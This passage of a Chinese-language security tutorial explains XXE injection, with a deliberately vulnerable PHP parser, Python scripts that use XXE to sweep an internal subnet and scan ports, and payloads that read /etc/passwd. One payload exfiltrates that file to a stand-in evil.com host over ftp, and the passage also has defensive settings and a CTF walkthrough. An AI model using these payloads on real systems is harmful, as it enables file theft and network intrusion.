punctuation">></span></span> // 定义一个内部实体]><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>note</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>to</span><span class="token punctuation">></span></span>Tove<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>to</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>from</span><span class="token punctuation">></span></span>Jani<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>from</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>heading</span><span class="token punctuation">></span></span>Reminder<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>heading</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>body</span><span class="token punctuation">></span></span>Don't forget me this weekend<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>body</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>note</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><blockquote><p>外部DTD</p></blockquote><p>外部引用分为通用实体和参数实体</p><ul><li><p>通用实体</p><pre class="line-numbers language-xml"><code class="language-xml"><span class="token prolog">&lt;?xml version="1.0" encoding="UTF-8"?></span><span class="token doctype">&lt;!DOCTYPE foo [&lt;!ELEMENT foo ANY ></span> #定义元素为ANY，即可以接受任何元素。&lt;!ENTITY xxe SYSTEM "file:///c:/test.dtd" >]> // 定义通用实体<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>root</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>body</span><span class="token punctuation">></span></span><span class="token entity" title="&xxe;">&amp;xxe;</span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>body</span><span class="token punctuation">></span></span> #定义一个外部实体<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>root</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li></ul><p>通过第 4 行的定义， 第 7 行的 &amp;xxe 就会对 c:/test.dtd 文件资源进行 SYSTEM 关键字的引用，这样对引用资源所做的任何更改都会在文档中自动更新。</p><p>另外除了上面 SYSTEM 关键字的引用方式，还有一种引用方式是使用 PUBLIC 引用公用 DTD 的方式，语法如下：</p><pre><code>&lt;!DOCTYPE 根元素名称 PUBLIC “DTD标识名” “公用DTD的URI”&gt;</code></pre><p>这个在我们的攻击中也可以起到和 SYSTEM 一样的作用，但实际上实体远不止这一种，我们以上涉及的实体只是其中的一种，被称为通用实体。</p><ul><li><p>参数实体</p><pre class="line-numbers language-xml"><code class="language-xml"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>!ENTITY</span> <span class="token attr-name">%</span> <span class="token attr-name">an-element</span> <span class="token attr-name">"&lt;!ELEMENT</span> <span class="token attr-name">mytag</span> <span class="token attr-name">(subtag)</span><span class="token punctuation">></span></span>">&lt;!ENTITY % remote-dtd SYSTEM "http://somewhere.example.org/remote.dtd">%an-element; %remote-dtd;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>  在上面的代码示例中，可以看到实体名前多了一个 “%” ，在参数实体中使用 “% 实体名” (这里面的空格不能少) 定义，并且只能在 DTD 中使用 “% 实体名” 引用。</p></li></ul><blockquote><p>通用实体和参数实体的区别</p></blockquote><ul><li><p><strong>“参数实体”在 DTD 中声明并在 DTD 中使用</strong></p><p>  DTD文件中只有参数实体才能引用其他实体</p></li><li><p><strong>“通用实体”在 DTD 中声明并在 XML 文档中使用</strong></p><p>  XML中必须要用通用实体引用DTD</p></li></ul><p>通过 DTD，您的每一个 XML 文件均可携带一个有关其自身格式的描述。</p><p>通过 DTD，独立的团体可一致地使用某个标准的 DTD 来交换数据。</p><p>而您的应用程序也可使用某个标准的 DTD 来验证从外部接收到的数据。</p><p>您还可以使用 DTD 来验证您自身的数据。</p><h1 id="XXE注入实例"><a href="#XXE注入实例" class="headerlink" title="XXE注入实例"></a>XXE注入实例</h1><pre class="line-numbers language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span>  <span class="token function">libxml_disable_entity_loader</span> <span class="token punctuation">(</span><span class="token boolean">false</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token variable">$xmlfile</span> <span class="token operator">=</span> <span class="token function">file_get_contents</span><span class="token punctuation">(</span>'php<span class="token punctuation">:</span><span class="token comment" spellcheck="true">//input');</span>  <span class="token variable">$dom</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">DOMDocument</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token variable">$dom</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">loadXML</span><span class="token punctuation">(</span><span class="token variable">$xmlfile</span><span class="token punctuation">,</span> <span class="token constant">LIBXML_NOENT</span> <span class="token operator">|</span> <span class="token constant">LIBXML_DTDLOAD</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token variable">$creds</span> <span class="token operator">=</span> <span class="token function">simplexml_import_dom</span><span class="token punctuation">(</span><span class="token variable">$dom</span><span class="token punctuation">)</span><span class="token punctuation">;</span>   <span class="token keyword">echo</span> <span class="token variable">$creds</span><span class="token punctuation">;</span><span class="token delimiter">?></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="libxml-disable-entity-loader"><a href="#libxml-disable-entity-loader" class="headerlink" title="libxml_disable_entity_loader"></a>libxml_disable_entity_loader</h2><blockquote><p>禁用加载外部实体的功能</p><p>当值为false时开启对xml实体的加载功能</p><p>默认是禁用的</p></blockquote><h2 id="php-input、-POST与-HTTP-RAW-POST-DATA"><a href="#php-input、-POST与-HTTP-RAW-POST-DATA" class="headerlink" title="php://input、$_POST与$HTTP_RAW_POST_DATA"></a>php://input、$_POST与$HTTP_RAW_POST_DATA</h2><ul><li><strong>$_POST</strong></li></ul><blockquote><p>这是在数据交互时的常用方法，但不能接收json格式的数据，因为==post是以关联数组方式组织提交的数据==，并对此进行<strong>编码处理</strong>，如urldecode，甚至<strong>编码转换</strong>，识别的<strong>数据类型是PHP默认识别的数据类型</strong>，如<strong>application/x-<a href="http://www.form-urlencoded/">www.form-urlencoded</a></strong>和<strong>multipart/form-data</strong>，无法解析如<strong>text/xml</strong>，<strong>application/json</strong>等非<strong>application/x-<a href="http://www.form-urlencoded/">www.form-urlencoded</a></strong> 数据类型的内容。</p></blockquote><ul><li>$HTTP_RAW_POST_DATA</li></ul><blockquote><p>==PHP默认识别的数据类型是application/x-<a href="http://www.form-urlencoded==,当**content-type=application/json">www.form-urlencoded==,当**Content-Type=application/json</a>**<br><strong>类型时无法通过 $_POST获取</strong>，但是使用 GLOBALS[‘HTTP_RAW_POST_DATA’]可以获取到。因为在PHP无法识别Content-Type的时候，就会把 POST 数据填入HTTP_RAW_POST_DATA 中。但<strong>这种方法需要设置 php.ini 中的 always_populate_raw_post_data 值为 On 才会生效</strong>，且当POST 与php://input可以取到值时 $HTTP_RAW_POST_DATA 为空，当enctype=”multipart/form-data”时也无法使用。</p><p><strong>php7已经移除了这个全局变量</strong></p></blockquote><ul><li><strong>php://input</strong></li></ul><blockquote><p>除<strong>Coentent-Type为multipart/form-data</strong>之外，PHP<strong>都会将http请求数据包中的相应数据填入php://input</strong>，填入的<strong>长度由Coentent-Length指定</strong>。并且只有当<strong>Content-Type为application/x-www-data-urlencoded</strong>时，php://input数据才跟$_POST数据相一致（格式不一致，内容一致）。</p></blockquote><h2 id="HTML-DOM-Document-对象"><a href="#HTML-DOM-Document-对象" class="headerlink" title="HTML DOM Document 对象"></a>HTML DOM Document 对象</h2><p>每个载入浏览器的 HTML 文档都会成为 Document 对象。</p><p>Document 对象使我们可以从脚本中对 HTML 页面中的所有元素进行访问。</p><h4 id="loadXML-方法"><a href="#loadXML-方法" class="headerlink" title="loadXML() 方法"></a>loadXML() 方法</h4><p>loadXML() 方法通过解析一个 XML 标签字符串来组成该文档。</p><p>语法：</p><pre class="line-numbers language-xml"><code class="language-xml">loadXML(text)<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><ul><li><p><strong>LIBXML_NOENT</strong> 该标志允许替换XML字符实体引用(无论是否外部).</p><p>  如果没有LIBXML_NOENT，它将导致内部和外部实体的行为不同，因为不会加载内部和外部实体.</p></li><li><p><strong>LIBXML_DTDLOAD</strong> 该表示允许加载DTD</p></li></ul><h2 id="simplexml-import-dom"><a href="#simplexml-import-dom" class="headerlink" title="simplexml_import_dom()"></a>simplexml_import_dom()</h2><p>该函数把 DOM 节点转换为 SimpleXMLElement 对象。</p><h3 id="语法"><a href="#语法" class="headerlink" title="语法"></a>语法</h3><pre class="line-numbers language-php"><code class="language-php"><span class="token function">simplexml_import_dom</span><span class="token punctuation">(</span>data<span class="token punctuation">,</span><span class="token keyword">class</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><table><thead><tr><th align="left">参数</th><th align="left">描述</th></tr></thead><tbody><tr><td align="left">data</td><td align="left">必需。规定要使用的 DOM 节点。</td></tr><tr><td align="left">class</td><td align="left">必需。规定新对象的 class。</td></tr></tbody></table><blockquote><p>因为xml的特性（语法严格），所以flag中包含如<code>&lt;&gt;&amp;&quot;&#39;</code>等会报错，所以这时需要使用CDATA，或者base64编码</p><p>什么是CDATA：</p><p>CDATA，意为character data，是标记语言SGML与XML，表示文档的特定部分是普通的字符数据，而不是非字符数据或有特定、限定结构的字符数据。在XML文档或外部实体中，一个CDATA section是一段按字面解释的内容，不作为标记文本。字符用CDATA节表示或者按照标准语法表示，并无差异。</p><p>CDATA 部分由<code>&quot;&lt;![CDATA[&quot;</code>开始，由<code>&quot;]]&gt;&quot;</code>结束</p></blockquote><h1 id="可用协议和平台的关系"><a href="#可用协议和平台的关系" class="headerlink" title="可用协议和平台的关系"></a>可用协议和平台的关系</h1><h2 id="总结概述："><a href="#总结概述：" class="headerlink" title="总结概述："></a>总结概述：</h2><blockquote><p>XXE和SSRF都能从服务器向另一台服务器发起请求，如果将远程服务器的地址换成某个内网的地址，（比如 192.168.0.10:8080）也能实现 SSRF 同样的效果</p><p>XXE 其实也是一种 SSRF 的攻击手法，因为 SSRF 其实只是一种攻击模式，利用这种攻击模式我们能使用很多的协议以及漏洞进行攻击。</p></blockquote><p><strong>所以在进行XXE攻击时，我们必须知道在何种平台能使用何种协议</strong></p><p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200201214217.png" alt="img"></p><h1 id="HTTP内网探测主机"><a href="#HTTP内网探测主机" class="headerlink" title="HTTP内网探测主机"></a>HTTP内网探测主机</h1><blockquote><p>正如刚才说的，XXE的本质其实就是一种SSRF。所以SSRF可以做到的事情XXE自然也能做到</p><p>因此XXE也可以探测内网主机</p></blockquote><p>内网探测主机脚本：</p><pre class="line-numbers language-python"><code class="language-python"><span class="token keyword">import</span> requests<span class="token keyword">import</span> base64<span class="token keyword">def</span> <span class="token function">XXE</span><span class="token punctuation">(</span>ip<span class="token punctuation">,</span>string<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">try</span><span class="token punctuation">:</span>        xml <span class="token operator">=</span> <span class="token triple-quoted-string string">"""&lt;?xml version="1.0" encoding="ISO-8859-1"?>"""</span>        xml <span class="token operator">=</span> xml <span class="token operator">+</span> <span class="token string">"\r\n"</span> <span class="token operator">+</span> <span class="token triple-quoted-string string">"""&lt;!DOCTYPE foo [ &lt;!ELEMENT foo ANY >"""</span>        xml <span class="token operator">=</span> xml <span class="token operator">+</span> <span class="token string">"\r\n"</span> <span class="token operator">+</span> <span class="token triple-quoted-string string">"""&lt;!ENTITY xxe SYSTEM """</span> <span class="token operator">+</span> <span class="token string">'"'</span> <span class="token operator">+</span> string <span class="token operator">+</span> <span class="token string">'"'</span> <span class="token operator">+</span> <span class="token triple-quoted-string string">""">]>"""</span>        xml <span class="token operator">=</span> xml <span class="token operator">+</span> <span class="token string">"\r\n"</span> <span class="token operator">+</span> <span class="token triple-quoted-string string">"""&lt;xml>"""</span>        xml <span class="token operator">=</span> xml <span class="token operator">+</span> <span class="token string">"\r\n"</span> <span class="token operator">+</span> <span class="token triple-quoted-string string">"""    &lt;stuff>&amp;xxe;&lt;/stuff>"""</span>        xml <span class="token operator">=</span> xml <span class="token operator">+</span> <span class="token string">"\r\n"</span> <span class="token operator">+</span> <span class="token triple-quoted-string string">"""&lt;/xml>"""</span>        x <span class="token operator">=</span> requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span><span class="token string">'http://192.168.50.132/xxe_blind_test.php'</span><span class="token punctuation">,</span> data<span class="token operator">=</span>xml<span class="token punctuation">,</span> headers<span class="token operator">=</span>headers<span class="token punctuation">,</span> timeout<span class="token operator">=</span><span class="token number">5</span><span class="token punctuation">)</span><span class="token punctuation">.</span>text        coded_string <span class="token operator">=</span> x<span class="token punctuation">.</span>split<span class="token punctuation">(</span><span class="token string">' '</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">2</span><span class="token punctuation">]</span>        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">' [+]'</span><span class="token punctuation">,</span>ip<span class="token punctuation">,</span><span class="token string">'Successfully Found !!!'</span><span class="token punctuation">)</span>    <span class="token keyword">except</span><span class="token punctuation">:</span>        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">' [-]'</span><span class="token punctuation">,</span>ip<span class="token punctuation">,</span><span class="token string">'Error Not Found !!!'</span><span class="token punctuation">)</span>          <span class="token keyword">pass</span>    <span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">'__main__'</span><span class="token punctuation">:</span>    headers <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token string">'Content-Type'</span><span class="token punctuation">:</span><span class="token string">'application/xml'</span><span class="token punctuation">}</span>    <span class="token keyword">for</span> i <span class="token keyword">in</span> range<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">255</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        ip <span class="token operator">=</span> <span class="token string">'192.168.50.'</span> <span class="token operator">+</span> str<span class="token punctuation">(</span>i<span class="token punctuation">)</span>        string <span class="token operator">=</span> <span class="token string">'php://filter/convert.base64-encode/resource=http://'</span> <span class="token operator">+</span> ip <span class="token operator">+</span> <span class="token string">'/'</span>        XXE<span class="token punctuation">(</span>ip<span class="token punctuation">,</span>string<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>探测到主机后，我们要对其进行端口扫描，原理同探测主机，只不过室将遍历ip地址变成了遍历端口号</p><p>当然也可以使用burp和nmap探测</p><p>XXE端口探测端口脚本</p><pre class="line-numbers language-python"><code class="language-python"><span class="token keyword">import</span> requests<span class="token keyword">import</span> base64<span class="token keyword">def</span> <span class="token function">XXE</span><span class="token punctuation">(</span>port<span class="token punctuation">)</span><span class="token punctuation">:</span>    xml <span class="token operator">=</span> <span class="token triple-quoted-string string">"""&lt;?xml version="1.0" encoding="utf-8"?> """</span>    xml <span class="token operator">=</span> xml <span class="token operator">+</span> <span class="token string">"\r\n"</span> <span class="token operator">+</span> <span class="token triple-quoted-string string">"""&lt;!DOCTYPE data SYSTEM "http://192.168.50.132:"""</span> <span class="token operator">+</span> str<span class="token punctuation">(</span>port<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token triple-quoted-string string">"""/" ["""</span>    xml <span class="token operator">=</span> xml <span class="token operator">+</span> <span class="token string">"\r\n"</span> <span class="token operator">+</span> <span class="token triple-quoted-string string">"""&lt;!ELEMENT data (#PCDATA)> """</span>    xml <span class="token operator">=</span> xml <span class="token operator">+</span> <span class="token string">"\r\n"</span> <span class="token operator">+</span> <span class="token triple-quoted-string string">"""]>"""</span>    xml <span class="token operator">=</span> xml <span class="token operator">+</span> <span class="token string">"\r\n"</span> <span class="token operator">+</span> <span class="token triple-quoted-string string">"""&lt;data>7&lt;/data>"""</span>    r <span class="token operator">=</span> requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span><span class="token string">'http://192.168.50.132/xxe_blind_test.php'</span><span class="token punctuation">,</span> data<span class="token operator">=</span>xml<span class="token punctuation">,</span>timeout<span class="token operator">=</span><span class="token number">5</span><span class="token punctuation">)</span>    <span class="token comment" spellcheck="true">#print(port,r.elapsed.total_seconds())</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token string">"Connection refused"</span> <span class="token keyword">in</span> r<span class="token punctuation">.</span>text<span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">" [-]"</span><span class="token punctuation">,</span> port<span class="token punctuation">,</span> <span class="token string">" seems shut down"</span><span class="token punctuation">)</span>    <span class="token keyword">else</span><span class="token punctuation">:</span>        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">" [+]"</span><span class="token punctuation">,</span> port<span class="token punctuation">,</span> <span class="token string">"is up"</span><span class="token punctuation">)</span><span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">'__main__'</span><span class="token punctuation">:</span>    <span class="token keyword">for</span> i <span class="token keyword">in</span> range<span class="token punctuation">(</span><span class="token number">9080</span><span class="token punctuation">,</span><span class="token number">9082</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        XXE<span class="token punctuation">(</span>i<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>无论什么脚本都需要根据实际的情况来决定，脚本不是一成不变的</p><h1 id="XXE漏洞挖掘"><a href="#XXE漏洞挖掘" class="headerlink" title="XXE漏洞挖掘"></a>XXE漏洞挖掘</h1><p>以下摘自：<code>https://ca01h.top/Web_security/basic_learning/20.xxe%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/#%E6%80%9D%E8%80%83</code></p><h2 id="常用检测方法"><a href="#常用检测方法" class="headerlink" title="常用检测方法"></a>常用检测方法</h2><h3 id="首先查看XML是否可以成功解析"><a href="#首先查看XML是否可以成功解析" class="headerlink" title="首先查看XML是否可以成功解析"></a>首先查看XML是否可以成功解析</h3><pre><code>&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;  &lt;!DOCTYPE ANY [  &lt;!ENTITY name &quot;test1&quot;&gt;]&gt;    &lt;root&gt;&amp;name;&lt;/root&gt;</code></pre><p>如果页面输出了test1，则可以解析XML。</p><h3 id="第二步查看是否支持DTD引用外部实体："><a href="#第二步查看是否支持DTD引用外部实体：" class="headerlink" title="第二步查看是否支持DTD引用外部实体："></a>第二步查看是否支持DTD引用外部实体：</h3><pre><code>&lt;?xml version=”1.0” encoding=”UTF-8”?&gt;  &lt;!DOCTYPE ANY [  &lt;!ENTITY % name SYSTEM &quot;http://myhost/index.html&quot;&gt;  %name;  ]&gt;</code></pre><p>然后在我的服务器上查看日志,如果有目标服务器向我的服务器发送了一条index.html的请求,说明<br>支持引用外部实体,很有可能存在xxe漏洞。</p><h3 id="外部普通实体"><a href="#外部普通实体" class="headerlink" title="外部普通实体"></a>外部普通实体</h3><p>当有回显时，利用file://协议:</p><pre><code>&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;    &lt;!DOCTYPE lltest[    &lt;!ENTITY xxe SYSTEM &quot;file:///C:/Windows/win.ini&quot;&gt;]&gt; &lt;user&gt;&lt;username&gt;&amp;xxe;&lt;/username&gt;&lt;password&gt;123456&lt;/password&gt;&lt;/user&gt;</code></pre><h3 id="外部参数实体"><a href="#外部参数实体" class="headerlink" title="外部参数实体"></a>外部参数实体</h3><p>当无回显，使用http协议:</p><pre><code>&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;&lt;!DOCTYPE note[ &lt;!ENTITY % lltest SYSTEM &quot;http://myhost:1234/test_xxe&quot;&gt;%lltest;]&gt;</code></pre><p>然后在myhost监听1234端口(dnslog地址也可以),查看是否有http请求。</p><h2 id="JSON-字符串XXE"><a href="#JSON-字符串XXE" class="headerlink" title="JSON 字符串XXE"></a>JSON 字符串XXE</h2><p>现在基本上所有的web程序都放弃了XML而使用JSON作为Clinet-Server 通信的数据格式</p><p>不过虽然只可以正确的接收一种，但服务器可以解释多种，这就导致了即使使用JSON接收数据，仍会收到XXE注入攻击</p><p><strong>测试方法很简单,就是将<code>Content-Type: application/json</code>修改为<code>Content-Type: application/xml</code>，数据格式不变，查看是否报错:</strong><br><strong><code>&#123;&quot;errors&quot;:&#123;&quot;errorMessage&quot;:&quot;org.xml.sax.SAXParseException: XML document structures must start and end within the same entity.&quot;&#125;&#125;</code></strong><br>可以发现服务器是可以处理xml数据的，于是我们利用这个来进行攻击。<br>payload:</p><pre><code>...Content-Type: application/xml...&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot; ?&gt;&lt;!DOCTYPE netspi [&lt;!ENTITY xxe SYSTEM &quot;file:///etc/passwd&quot; &gt;]&gt;&lt;root&gt;&lt;param1&gt;name&lt;/param1&gt;&lt;param2&gt;&amp;xxe;&lt;/param2&gt;&lt;/root&gt;</code></pre><p>查看是否可以读取敏感文件。</p><h2 id="利用FTP协议获取敏感信息"><a href="#利用FTP协议获取敏感信息" class="headerlink" title="利用FTP协议获取敏感信息"></a>利用FTP协议获取敏感信息</h2><p>利用ftp协议获取服务器信息/内网ip之类的技巧：<br>在攻击者服务器上运行rb脚本(模拟FTP服务器:<a href="https://github.com/ONsec-Lab/scripts/blob/master/xxe-ftp-server.rb),%E7%9B%91%E5%90%AC8080%E7%AB%AF%E5%8F%A3%E3%80%82">https://github.com/ONsec-Lab/scripts/blob/master/xxe-ftp-server.rb),监听8080端口。</a><br>然后在web程序那里输入payload:</p><pre><code>&lt;?xml version=&quot;1.0&quot;?&gt;&lt;!DOCTYPE a [   &lt;!ENTITY % asd SYSTEM &quot;http://evil.com/ext.dtd&quot;&gt;    %asd;    %rrr; ]&gt;&lt;a&gt;&lt;/a&gt;</code></pre><p>ext.dtd</p><pre><code>&lt;!ENTITY % b SYSTEM &quot;file:///etc/passwd&quot;&gt;&lt;!ENTITY % c &quot;&lt;!ENTITY &amp;#37; rrr SYSTEM &#39;ftp://evil.com:8000/%b;&#39;&gt;&quot;&gt;</code></pre><p>然后在模拟的FTP服务器上就会收到一些服务器信息/文件内容</p><p>技巧来自：<a href="http://lab.onsec.ru/2014/06/xxe-oob-exploitation-at-java-17.html">http://lab.onsec.ru/2014/06/xxe-oob-exploitation-at-java-17.html</a></p><h2 id="Bypass"><a href="#Bypass" class="headerlink" title="Bypass"></a>Bypass</h2><p>有时Server会将用户的输入做一定的限制，但XXE的攻击模式和XML的传参方式注定限制不可能过多（会影响网站的性能），所以按过滤的情况百度即可</p><h1 id="无法调用外部实体时的注入"><a href="#无法调用外部实体时的注入" class="headerlink" title="无法调用外部实体时的注入"></a>无法调用外部实体时的注入</h1><h2 id="内部实体引用"><a href="#内部实体引用" class="headerlink" title="内部实体引用"></a>内部实体引用</h2><pre class="line-numbers language-xml"><code class="language-xml"><span class="token prolog">&lt;?xml version="1.0"?></span><span class="token doctype">&lt;!DOCTYPE message [    &lt;!ENTITY % remote SYSTEM "/usr/share/yelp/dtd/docbookx.dtd"></span>    &lt;!ENTITY % file SYSTEM "php://filter/read=convert.base64-encode/resource=file:///flag">    &lt;!ENTITY % ISOamso '        &lt;!ENTITY <span class="token entity" title="&#x25;">&amp;#x25;</span> eval "&lt;!ENTITY <span class="token entity" title="&#x26;">&amp;#x26;</span>#x25; send SYSTEM <span class="token entity" title="&#x27;">&amp;#x27;</span>file://hhhhhhhh/?<span class="token entity" title="&#x25;">&amp;#x25;</span>file;<span class="token entity" title="&#x27;">&amp;#x27;</span>>">        <span class="token entity" title="&#x25;">&amp;#x25;</span>eval;        <span class="token entity" title="&#x25;">&amp;#x25;</span>send;    '>     %remote;]><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>message</span><span class="token punctuation">></span></span>1234<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>message</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="三层嵌套"><a href="#三层嵌套" class="headerlink" title="三层嵌套"></a>三层嵌套</h2><pre class="line-numbers language-xml"><code class="language-xml"><span class="token prolog">&lt;?xml version="1.0"?></span><span class="token doctype">&lt;!DOCTYPE message [    &lt;!ELEMENT message ANY></span>    &lt;!ENTITY % para1 SYSTEM "file:///flag">    &lt;!ENTITY % para '        &lt;!ENTITY <span class="token entity" title="&#x25;">&amp;#x25;</span> para2 "&lt;!ENTITY <span class="token entity" title="&#x26;">&amp;#x26;</span>#x25; error SYSTEM <span class="token entity" title="&#x27;">&amp;#x27;</span>file:///<span class="token entity" title="&#x25;">&amp;#x25;</span>para1;<span class="token entity" title="&#x27;">&amp;#x27;</span>>">        <span class="token entity" title="&#x25;">&amp;#x25;</span>para2;    '>    %para;]><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>message</span><span class="token punctuation">></span></span>10<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>message</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>这部分可以看2019 Google CTF-XXE <code>https://zhuanlan.zhihu.com/p/88125925</code></p><p>应该算是XXE部分最难的题目</p><h1 id="XXE的防御"><a href="#XXE的防御" class="headerlink" title="XXE的防御"></a>XXE的防御</h1><p>以下摘自<code>https://ca01h.top/Web_security/basic_learning/20.xxe%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/#XXE%E5%A6%82%E4%BD%95%E9%98%B2%E5%BE%A1</code></p><p>1、使用开发语言提供的禁用外部实体的方法<br>php:</p><pre><code>libxml_disable_entity_loader(true);</code></pre><p>java:</p><pre><code>DocumentBuilderFactory dbf =DocumentBuilderFactory.newInstance();dbf.setExpandEntityReferences(false);</code></pre><p>Python:</p><pre><code>from lxml import etreexmlData = etree.parse(xmlSource,etree.XMLParser(resolve_entities=False))</code></pre><p>2、过滤用户提交的XML数据<br>过滤关键字：<code>&lt;\!DOCTYPE</code>和<code>&lt;\!ENTITY</code>，或者<code>SYSTEM</code>和<code>PUBLIC</code>。<br>3、不允许XML中含有自己定义的DTD</p><h1 id="用CTF题目理解XXE攻击"><a href="#用CTF题目理解XXE攻击" class="headerlink" title="用CTF题目理解XXE攻击"></a>用CTF题目理解XXE攻击</h1><h2 id="NCTF2019-Fake-XML-cookbook"><a href="#NCTF2019-Fake-XML-cookbook" class="headerlink" title="[NCTF2019]Fake XML cookbook"></a>[NCTF2019]Fake XML cookbook</h2><p><img src="image-20210922115020731.png" alt="image-20210922115020731"></p><p>进入后首先可以看到一个登录页面，直接先上CTF三部曲——看源码、抓包、找后台</p><p><img src="image-20210922115306562.png" alt="image-20210922115306562"></p><p>这道题很直白，可以明显的看到这是XXE漏洞</p><p>如果是application/json  就要转为xml试一试了，一般来说，看传参格式是<code>&lt;...&gt;</code>基本就可以确定是xml了</p><p>当然也可以测试一下</p><p><img src="image-20210922121057721.png" alt="image-20210922121057721"></p><p>测试方法就是随便写一个不可能被过滤的字符，然后看看响应的回显</p><p>根据之前所学的XML语法，来构造payload,当然一般情况下可以直接百度payload</p><p><img src="image-20210922120057063.png" alt="image-20210922120057063"></p><blockquote><p>file伪协议payload：</p></blockquote><pre class="line-numbers language-xml"><code class="language-xml"><span class="token prolog">&lt;?xml version="1.0"?></span><span class="token doctype">&lt;!DOCTYPE root [&lt;!ENTITY file SYSTEM "file:///etc/passwd"></span>]><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>user</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>username</span><span class="token punctuation">></span></span><span class="token entity" title="&file;">&amp;file;</span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>username</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>password</span><span class="token punctuation">></span></span>1111<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>password</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>user</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>file协议用于要读取的文件没有如<code>&lt;&amp;</code>等特殊字符的情况下，有特殊字符会导致失败报错</p><blockquote><p>php伪协议payload</p></blockquote><pre class="line-numbers language-xml"><code class="language-xml"><span class="token prolog">&lt;?xml version="1.0"?></span><span class="token doctype">&lt;!DOCTYPE root [&lt;!ENTITY file SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd"></span>]><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>user</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token 